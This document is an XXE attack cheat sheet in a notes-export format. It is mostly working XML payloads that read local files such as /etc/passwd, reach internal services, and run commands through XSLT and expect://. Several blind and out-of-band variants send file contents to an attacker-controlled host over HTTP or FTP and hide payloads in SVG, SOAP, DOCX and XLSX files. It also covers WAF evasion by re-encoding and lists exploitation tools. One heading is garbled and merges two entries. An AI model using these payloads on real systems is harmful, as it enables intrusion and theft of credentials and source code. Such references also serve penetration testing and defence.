entries.title: What internal and external entities are
entries.body:
Internal Entity: declared inside the DTD.
  Syntax: <!ENTITY entity_name "entity_value">

External Entity: declared externally, pulls in a resource. Recognizable by SYSTEM.
  Syntax: <!ENTITY entity_name SYSTEM "entity_value">

SYSTEM and PUBLIC are almost synonyms - if SYSTEM is blocked by the WAF, try PUBLIC:
  <!ENTITY % xxe PUBLIC "Random Text" "URL">
  <!ENTITY xxe PUBLIC "Any TEXT" "URL">

Tip: in a request with an XML body, set the header Content-Type: application/xml.

entries.title: Basic test for entity parsing
entries.body:
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>

rows: Inside the content of the XML document

entries.title: Classic XXE - reading /etc/passwd (one-liner)
entries.body: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>

entries.title: Classic XXE - reading /etc/passwd
entries.body:
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

entries.title: Classic XXE - variant with ELEMENT ANY
entries.body:
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

entries.title: Classic XXE - reading a Windows file (boot.ini)
entries.body:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

entries.title: Classic XXE in Base64 (data:// wrapper)
entries.body: <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

entries.title: PHP wrapper - reading the source in Base64
entries.body:
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>

entries.title: PHP wrapper - Base64 + reading over HTTP
entries.body:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>

entries.title: XInclude - when you cannot modify the DOCTYPE
entries.body:
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

entries.title: XSLT - reading a file via document()
entries.body: <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>

entries.title: XSLT - RCE via php:function (if PHP-EXSLT is enabled)
entries.body: <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>

entries.title: SSRF - reaching an internal service
entries.body:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>

entries.title: Tip: when there is no output - blind and OOB
entries.body:
If the result is not displayed on the page - the data can still be extracted out-of-band.
The easiest way to verify blind XXE: make the parser hit an endpoint you control (DNS/HTTP callback).
Then you escalate to exfiltrating the file content via an external DTD or error-based.

FTP instead of HTTP lets you pull entire files (over HTTP often only the first line comes back).

entries.title: Basic Blind XXE - parameter entity
entries.body:
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x"> %ext;
]>
<r></r>

entries.title: Basic Blind XXE - general entity (callback)
entries.body:
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>
<root>&test;</root>

entries.title: Blind XXE - sending /etc/passwd to your server
entries.body:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "http://[ATTACKER.DOMAIN.TLD]/?%xxe;">
]
>
<foo>&callhome;</foo>

entries.title: OOB XXE - external DTD (Yunusov, 2013)
entries.body:
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd">
<data>&send;</data>

File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>">
%all;

entries.title: OOB XXE - external DTD + PHP filter (Base64)
entries.body:
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://10.10.10.10/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://10.10.10.10/dtd.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>">

entries.title: XXE via DTD file only (for example, MITM)
entries.body:
<!-- Load the contents of a sensitive file into a variable -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
<!ENTITY % param1 '<!ENTITY % external SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x=%payload;">'>
%param1;
%external;

entries.title: OOB XXE via Apache Karaf (CVE-2018-11788)
entries.body:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://[ATTACKER.DOMAIN.TLD]"> %dtd;]>
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>

meta.note: Affects Apache Karaf <= 4.2.1 and <= 4.1.6. The XML file is dropped into the deploy folder.

entries.title: Confirming error-based - file name in the error
entries.body:
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
    %local_dtd;
]>
<root></root>

entries.title: Error-based via a remote DTD
entries.body:
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/ext.dtd">
    %ext;
]>
<message></message>

entries.title: Contents of ext.dtd for error-based
entries.body:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

entries.title: Contents of ext.dtd - alternative variant
entries.body:
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % leak SYSTEM '%data;:///'>">
%eval;
%leak;

entries.title: Tip: how error-based exfiltration works
entries.body:
The idea: the file content is substituted into the path of a nonexistent file, the parser fails, and outputs that path (together with the data) in the error text.

1. <!ENTITY % file SYSTEM "file:///etc/passwd"> - load the file into a parameter entity.
2. <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>"> - % is the URL-encoded '%', needed to declare an entity inside an entity.
3. %eval; - defines the error entity.
4. %error; - a reference to a nonexistent file whose path has the contents of /etc/passwd baked in -> an error with the data.

Works only if the application returns the parser error text to the user.

entries.title: Tip: the local DTD trick
entries.body:
If only error-based exfiltration is available and you cannot load your own remote DTD - use a DTD that already exists on the system. You redefine a parameter entity in it and pull out the file via concatenation.

Linux: look for DTDs with the command `locate .dtd`. Often present:
  /usr/share/xml/fontconfig/fonts.dtd
  /usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
  /usr/share/xml/svg/svg10.dtd
  /usr/share/xml/svg/svg11.dtd
  /usr/share/yelp/dtd/docbookx.dtd

In fonts.dtd on line 148 there is a redefinable entity %constant.
Windows: cim20.dtd at the path C:\Windows\System32\wbem\xml\cim20.dtd.
The GoSecure/dtd-finder tool helps find local DTDs and generate a payload.

entries.title: Linux - local DTD fonts.dtd (reading /etc/passwd)
entries.body:
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY % file SYSTEM "file:///etc/passwd">
            <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///patt/%file;'>">
            %eval;
            %error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>

entries.title: Windows - local DTD cim20.dtd (reading a file)
entries.body:
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY % file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file://t/#%file;'>">
        %eval;
        %error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>anything</xxx>

entries.title: Windows - local DTD cim20.dtd (disclosing an HTTP response)
entries.body:
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY % file SYSTEM "https://erp.company.com">
        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file://test/#%file;'>">
        %eval;
        %error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>anything</xxx>

entries.title: Warning about DoS attacks
entries.body: Warning: these attacks can take down the service or the entire server. Do not run them in production.

entries.title: YAML Bomb - a YAML equivalent of Billion Laughs
Tip: bypassing the WAF by changing the encoding
entries.body:
XML parsers determine the encoding in 4 ways:
  • HTTP Content-Type: charset=utf-8
  • Byte Order Mark (BOM)
  • the first bytes of the document: UTF-8 (3C 3F 78 6D), UTF-16BE (00 3C 00 3F), UTF-16LE (3C 00 3F 00)
  • the XML declaration: <?xml version="1.0" encoding="UTF-8"?>

If the WAF filters an ASCII payload - re-encode it to UTF-16, the parser will still understand it while the WAF signatures will miss.

entries.title: Re-encoding the payload to UTF-16 (iconv)
entries.body: cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml

entries.title: XXE on JSON endpoints (changing the Content-Type)
Tip: swapping JSON for XML
entries.body:
On a JSON endpoint, try switching the Content-Type from application/json to application/xml and resending the body as XML.

• An XML document must have a single root element (<root>) - the parent of all the others.
• The data also needs to be converted to XML, otherwise the server will return a parsing error, for example:
  org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.

Tool: NetSPI Content-Type Converter (a Burp extension).

entries.title: SVG - RCE via expect:// (if enabled)
entries.body:
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>

entries.title: SVG - classic XXE (reading a file)
entries.body:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>

entries.title: SVG - OOB via rasterization (xxe.svg)
entries.body:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://10.10.10.10:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>

entries.title: SVG rasterization - external xxe.xml (DTD)
entries.body:
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>">

entries.title: SOAP - XXE inside CDATA
entries.body:
<soap:Body>
  <foo>
  <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://10.10.10.10:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>

entries.title: Tip: XXE in DOCX/Office Open XML
entries.body:
The Office Open XML format is a zip archive. Inject the payload into any .xml inside:
  • /_rels/.rels
  • [Content_Types].xml
  • the main document: /word/document.xml, /ppt/presentation.xml, /xl/workbook.xml

After editing, repackage: zip -u xxe.docx "[Content_Types].xml"

Tools: BuffaloWill/oxml_xxe (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF), whitel1st/docem.

entries.title: Tip: XXE in XLSX (repackaging the archive)
entries.body:
Extract: 7z x -oXXE xxe.xlsx
Add a blind-XXE payload to xl/workbook.xml (or xl/sharedStrings.xml).
Repackage: cd XXE && zip -r -u ../xxe.xlsx *

Important: use zip -u, and NOT 7z u / 7za u / 7zz - they recompress differently, and many Excel libraries won't recognize the file. The correct signature (file XXE.xlsx) -> Microsoft Excel 2007+; a broken one -> Microsoft OOXML. Alternative: 7z a -tzip gives a correct signature.

A remote DTD saves time: you build the document once and only change the DTD. FTP instead of HTTP lets you pull large files.

entries.title: XLSX - payload in xl/workbook.xml
entries.body:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">

entries.title: XLSX - payload in xl/sharedStrings.xml
entries.body:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>

entries.title: XLSX - external xxe.dtd (FTP exfiltration)
entries.body:
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>">

entries.title: Tools for XXE
entries.body:
• staaldraad/xxeserv - a mini web server with FTP support for XXE payloads.
  Run DTD + receive over FTP: xxeserv -o files.log -p 2121 -w -wd public -wp 8000
• lc/230-OOB - an OOB XXE server for pulling out files over FTP (+ a generator at xxe.sh).
• enjoiz/XXEinjector - automated XXE exploitation via direct and OOB methods.
• BuffaloWill/oxml_xxe - embedding XXE into DOCX/XLSX/PPTX, ODT, SVG, PDF, JPG, GIF.
• whitel1st/docem - embedding XXE/XSS into docx, odt, pptx, etc.
• GoSecure/dtd-finder - finding local DTDs and generating payloads for them.
